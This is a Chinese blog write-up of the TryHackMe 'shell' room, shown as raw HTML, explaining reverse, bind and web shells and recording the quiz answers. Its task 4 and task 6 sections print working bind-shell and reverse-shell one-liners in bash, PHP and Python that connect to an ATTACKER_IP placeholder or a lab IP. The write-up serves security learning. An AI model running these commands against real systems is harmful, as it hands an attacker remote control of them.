@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>tryhackme-shell：概括 | Asuna</title><meta name="author" content="Asuna"><meta name="copyright" content="Asuna"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习目标在这个房间中，我们将讨论以下学习目标： 了解进攻性安全中的 Shell设置并使用反向和绑定 Shell部署 Web Shell  task2什么是 Shell？Shell 是一种允许用户与操作系统交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。 在网络安全中，它通常指攻击者在访问受感染系统时使用的特定 shell 会话，允许他们运行命令和执行软件。这 将">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme-shell：概括">
+<meta property="og:url" content="https://oasko.github.io/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/index.html">
+<meta property="og:site_name" content="Asuna">
+<meta property="og:description" content="学习目标在这个房间中，我们将讨论以下学习目标： 了解进攻性安全中的 Shell设置并使用反向和绑定 Shell部署 Web Shell  task2什么是 Shell？Shell 是一种允许用户与操作系统交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。 在网络安全中，它通常指攻击者在访问受感染系统时使用的特定 shell 会话，允许他们运行命令和执行软件。这 将">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg">
+<meta property="article:published_time" content="2025-03-14T10:21:41.000Z">
+<meta property="article:modified_time" content="2025-03-14T16:13:49.803Z">
+<meta property="article:author" content="Asuna">
+<meta property="article:tag" content="tryhackme linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "tryhackme-shell：概括",
+  "url": "https://oasko.github.io/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/",
+  "image": "https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg",
+  "datePublished": "2025-03-14T10:21:41.000Z",
+  "dateModified": "2025-03-14T16:13:49.803Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Asuna",
+      "url": "https://oasko.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://oasko.github.io/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'tryhackme-shell：概括',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/touming.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://s2.loli.net/2024/12/28/fdpLbCNQwExoPan.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tag</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fa fa-book"></i><span> 图书</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 知识点</span></a></div><div class="menus_item"><a class="site-page" href="/chat/"><i class="fa-fw fa fa-lightbulb-o"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: [object Object];"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Asuna</span></a><a class="nav-page-title" href="/"><span class="site-name">tryhackme-shell：概括</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tag</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fa fa-book"></i><span> 图书</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 知识点</span></a></div><div class="menus_item"><a class="site-page" href="/chat/"><i class="fa-fw fa fa-lightbulb-o"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">tryhackme-shell：概括</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-14T10:21:41.000Z" title="发表于 2025-03-14 18:21:41">2025-03-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-14T16:13:49.803Z" title="更新于 2025-03-15 00:13:49">2025-03-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/title.png" alt="title"><br>学习目标<br>在这个房间中，我们将讨论以下学习目标：</p>
+<p>了解进攻性安全中的 Shell<br>设置并使用反向和绑定 Shell<br>部署 Web Shell </p>
+<h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>什么是 Shell？<br>Shell 是一种允许用户与操作系统交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。</p>
+<p>在网络安全中，它通常指攻击者在访问受感染系统时使用的特定 shell 会话，允许他们运行命令和执行软件。这 将允许攻击者执行多项活动，其中一些活动如下所述。</p>
+<ul>
+<li><p>远程系统控制：允许攻击者在目标系统中远程执行命令或软件。<br>权限提升：如果通过 shell 的初始访问受到限制，攻击者可以探索将权限提升到更高级或管理访问权限的方法。</p>
+</li>
+<li><p>数据泄露：一旦攻击者获得 shell 的执行权限，他们就可以探索系统并读取和复制敏感数据。</p>
+</li>
+<li><p>持久性和维护性访问：一旦获得 shell 访问权限，攻击者可以通过用户和凭据创建访问权限或复制后门软件以维持对目标系统的访问权限以供日后使用。</p>
+</li>
+<li><p>后利用活动：获得对 shell 的访问权限后，攻击者可以执行各种后利用活动，例如部署恶意软件、创建隐藏帐户和删除信息。</p>
+</li>
+<li><p>访问网络上的其他系统：根据攻击者的意图，获得的 shell 可能只是一个初始访问点。目标可能是使用获得的 shell 作为枢轴，通过网络跳转到不同的目标，到达受感染系统网络中的不同点。这也称为枢轴转移(pivoting)。</p>
+</li>
+</ul>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task2.png" alt="task2"></p>
+<p>第一问是shell</p>
+<p>第二问是用枢轴转移(pivoting)</p>
+<p>第三问是用Privilege Escalation（权限提升）</p>
+<h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p>反向 Shell(Reverse Shell)</p>
+<p>反向 shell（有时也称为“连接回 shell”）是网络攻击中获取系统访问权限的最常用技术之一。连接从目标系统发起到攻击者的机器，这可以帮助避免被网络防火墙和其他安全设备检测到。</p>
+<p>反向 Shell 的工作原理<br>设置 Netcat（nc）监听器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ nc -lvnp 443</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"># -l 选项指示 Netcat 监听或等待连接。</span><br><span class="line"># -v选项启用详细模式。</span><br><span class="line"># -n选项阻止连接使用 DNS 进行查找，因此它不会解析任何主机名，而是使用 IP 地址。</span><br><span class="line"># -p标志指示将用于等待连接的端口</span><br></pre></td></tr></table></figure>
+
+<p>还有很多反向shell的使用 可以看这个<a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">网站</a></p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task3.png" alt="task3"></p>
+<p>第一问毋庸置疑 reverse shell 反向shell</p>
+<p>第二问使用netcat工具</p>
+<h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>绑定 Shell(Bind Shell)<br>顾名思义，绑定 shell 将绑定受感染系统上的端口并监听连接；当发生此连接时，它会暴露 shell 会话，以便攻击者可以远程执行命令。</p>
+<p>当受感染目标不允许传出连接时可以使用这种方法，但它往往不太受欢迎，因为它需要保持活动状态并监听连接，这可能导致检测。</p>
+<p>绑定 shell 的工作原理<br>在目标上设置绑定 Shell</p>
+<p>让我们创建一个绑定 shell。在这种情况下，攻击者可以在目标机器上使用如下命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc -l 0.0.0.0 8080 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>有效载荷的解释</p>
+<ul>
+<li><p>rm -f &#x2F;tmp&#x2F;f- 此命令将删除位于 的任何现有命名管道文件&#x2F;tmp&#x2F;f&#x2F;。这可确保脚本可以创建新的命名管道而不会发生冲突。</p>
+</li>
+<li><p>mkfifo &#x2F;tmp&#x2F;f- 此命令在 处创建一个命名管道或 FIFO &#x2F;tmp&#x2F;f。命名管道允许进程之间进行双向通信。在这种情况下，它充当输入和输出的管道。</p>
+</li>
+<li><p>cat &#x2F;tmp&#x2F;f- 此命令从命名管道读取数据。它等待可以通过管道发送的输入。</p>
+</li>
+<li><p>| bash -i 2&gt;&amp;1- 的输出 cat通过管道传输到 shell 实例 ( bash -i)，这允许攻击者以交互方式执行命令。 将2&gt;&amp;1标准错误重定向到标准输出，确保将错误消息返回给攻击者。</p>
+</li>
+<li><p>| nc -l 0.0.0.0 8080-l-在所有接口 ( 0.0.0.0) 和端口上以监听模式 ( ) 启动 Netcat 80</p>
+</li>
+<li><blockquote>
+<p>&#x2F;tmp&#x2F;f 最后部分将命令的输出发送回命名管道，实现双向通信。</p>
+</blockquote>
+</li>
+</ul>
+<p>低于 1024 的端口将需要提升的权限执行 Netcat</p>
+<p>攻击者连接到Bind Shell</p>
+<p>现在目标机器正在等待传入连接，我们可以再次使用 Netcat 使用以下命令进行连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv TARGET_IP 8080</span><br></pre></td></tr></table></figure>
+<p>命令说明<br>nc- 这将调用 Netcat，建立与目标的连接。<br>-n- 禁用DNS解析，使 Netcat 运行得更快并避免不必要的查找。<br>-v- 详细模式提供连接过程的详细输出，例如连接何时建立。<br>TARGET_IP- 运行绑定 shell 的目标机器的 IP 地址。<br>8080- 绑定 shell 监听的端口号。</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task4.png" alt="task4"></p>
+<p>第一问是bind shell</p>
+<p>第二问是1024 低于1024的都需要提升权限才能使用</p>
+<h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>shell监听器</p>
+<h3 id="1-Rlwrap"><a href="#1-Rlwrap" class="headerlink" title="1. Rlwrap"></a>1. Rlwrap</h3><p>它是一个小型实用程序，使用 GNU readline 库来提供编辑键盘和历史记录。</p>
+<p>使用示例（使用 Rlwrap 增强 Netcat Shell）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ rlwrap nc -lvnp 443</span><br><span class="line">listening on [any] 443 ...</span><br></pre></td></tr></table></figure>
+<p>允许使用箭头键和历史记录等功能实现更好的交互。</p>
+<h3 id="2-Ncat"><a href="#2-Ncat" class="headerlink" title="2. Ncat"></a>2. Ncat</h3><p>Ncat<br>Ncat 是NMAP项目发布的 Netcat 的改进版本。它提供了加密（SSL）等额外功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ ncat --ssl -lvnp 4444</span><br><span class="line">Ncat: Version 7.94SVN ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</span><br><span class="line">Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F</span><br><span class="line">Ncat: Listening on [::]:443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Socat"><a href="#3-Socat" class="headerlink" title="3. Socat"></a>3. Socat</h3><p>它是一个实用程序，允许您在两个数据源（在本例中是两个不同的主机）之间创建套接字连接。</p>
+<p>默认使用示例（监听反向 Shell）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT</span><br><span class="line">2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443</span><br></pre></td></tr></table></figure>
+<p>上述命令使用了-d选项来启用详细输出；再次使用 -d 将增加命令的详细程度。<br>该选项在端口 上TCP-LISTEN:443创建一个TCP443侦听器，为传入连接建立服务器套接字。最后，STDOUT选项将所有传入数据定向到终端。</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task5.png" alt="task5"></p>
+<h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><h4 id="1-普通-Bash-反向-Shell"><a href="#1-普通-Bash-反向-Shell" class="headerlink" title="1. 普通 Bash 反向 Shell"></a>1. 普通 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+<p>该反向 shell 启动一个交互式 bash shell，该 shell 通过TCP连接将输入和输出重定向到攻击者的 IP（ATTACKER_IP）上的端口443。&gt;&amp;运算符结合了标准输出和标准错误。</p>
+<h4 id="2-Bash-读取行-反向-Shell"><a href="#2-Bash-读取行-反向-Shell" class="headerlink" title="2. Bash 读取行 反向 Shell"></a>2. Bash 读取行 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/443; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done </span><br></pre></td></tr></table></figure>
+<p>此反向 shell 创建一个新的文件描述符（5 在本例中）并连接到TCP套接字。它将从套接字读取并执行命令，并通过同一套接字将输出发回。</p>
+<h4 id="3-带有文件描述符-196-的-Bash-反向-Shell"><a href="#3-带有文件描述符-196-的-Bash-反向-Shell" class="headerlink" title="3. 带有文件描述符 196 的 Bash 反向 Shell"></a>3. 带有文件描述符 196 的 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKER_IP/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 </span><br></pre></td></tr></table></figure>
+<p>此反向 shell 使用文件描述符（196 在本例中）建立TCP连接。它允许 shell 从网络读取命令并通过同一连接发送输出。</p>
+<h4 id="4-使用文件描述符-5-的-Bash-反向-Shell"><a href="#4-使用文件描述符-5-的-Bash-反向-Shell" class="headerlink" title="4. 使用文件描述符 5 的 Bash 反向 Shell"></a>4. 使用文件描述符 5 的 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ bash -i 5&lt;&gt; /dev/tcp/ATTACKER_IP/443 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br></pre></td></tr></table></figure>
+<p>与第一个例子类似，此命令打开一个 shell ( bash -i)，但它使用文件描述符进行输入和输出，从而通过TCP5连接实现交互式会话。</p>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="1-使用-exec-函数实现PHP反向-Shell"><a href="#1-使用-exec-函数实现PHP反向-Shell" class="headerlink" title="1. 使用 exec 函数实现PHP反向 Shell"></a>1. 使用 exec 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br></pre></td></tr></table></figure>
+<p>该反向shell 在端口上创建到攻击者IP的套接字连接443，并使用该 exec 函数执行shell，重定向标准输入和输出。</p>
+<h4 id="2-使用shell-exec-函数实现PHP反向-Shell"><a href="#2-使用shell-exec-函数实现PHP反向-Shell" class="headerlink" title="2. 使用shell_exec 函数实现PHP反向 Shell"></a>2. 使用shell_exec 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);shell_exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p>与上一个命令类似，但使用 shell_exec 函数。</p>
+<h4 id="3-使用-system-函数实现PHP反向-Shell"><a href="#3-使用-system-函数实现PHP反向-Shell" class="headerlink" title="3. 使用 system 函数实现PHP反向 Shell"></a>3. 使用 system 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);system(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br></pre></td></tr></table></figure>
+<p>该反向shell 采用了system 函数，执行命令并将结果输出到浏览器。</p>
+<h4 id="4-使用-passthru-函数实现PHP反向-Shell"><a href="#4-使用-passthru-函数实现PHP反向-Shell" class="headerlink" title="4.使用 passthru 函数实现PHP反向 Shell"></a>4.使用 passthru 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);passthru(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p>passthru函数执行命令并将原始输出发送回浏览器。这在处理二进制数据时很有用。</p>
+<h4 id="5-使用-popen-函数实现PHP反向-Shell"><a href="#5-使用-popen-函数实现PHP反向-Shell" class="headerlink" title="5.使用 popen 函数实现PHP反向 Shell"></a>5.使用 popen 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);popen(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27; </span><br></pre></td></tr></table></figure>
+<p>反向shell用于popen打开进程文件指针，从而允许执行shell。</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="1-通过导出环境变量获取-Python-反向-Shell"><a href="#1-通过导出环境变量获取-Python-反向-Shell" class="headerlink" title="1.通过导出环境变量获取 Python 反向 Shell"></a>1.通过导出环境变量获取 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ export RHOST=&quot;ATTACKER_IP&quot;; export RPORT=443; python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27; </span><br></pre></td></tr></table></figure>
+<p>该反向 shell 将远程主机和端口设置为环境变量，创建套接字连接，并复制套接字文件描述符以用于标准输入&#x2F;输出。</p>
+<h4 id="2-使用-subprocess-模块的-Python-反向-Shell"><a href="#2-使用-subprocess-模块的-Python-反向-Shell" class="headerlink" title="2.使用 subprocess 模块的 Python 反向 Shell"></a>2.使用 subprocess 模块的 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.4.99.209&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27; </span><br></pre></td></tr></table></figure>
+<p>该反向shell使用该subprocess模块生成一个shell，并通过导出环境变量命令设置与Python反向shell类似的环境。</p>
+<h4 id="3-简短的-Python-反向-Shell"><a href="#3-简短的-Python-反向-Shell" class="headerlink" title="3.简短的 Python 反向 Shell"></a>3.简短的 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p>这个反向 shell 创建一个套接字 ( s)，连接到攻击者，并使用将标准输入、输出和错误重定向到套接字 os.dup2()。</p>
+<p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task6.png" alt="task6"></p>
+<h2 id="task7"><a href="#task7" class="headerlink" title="task7"></a>task7</h2><p>web shell</p>
+<p>Web Shell 是用受感染 Web 服务器支持的语言编写的脚本，可通过 Web 服务器本身执行命令。Web Shell 通常是一个文件，其中包含执行命令和处理文件的代码。它可以隐藏在受感染的 Web 应用程序或服务中，因此很难被发现，在攻击者中非常受欢迎。</p>
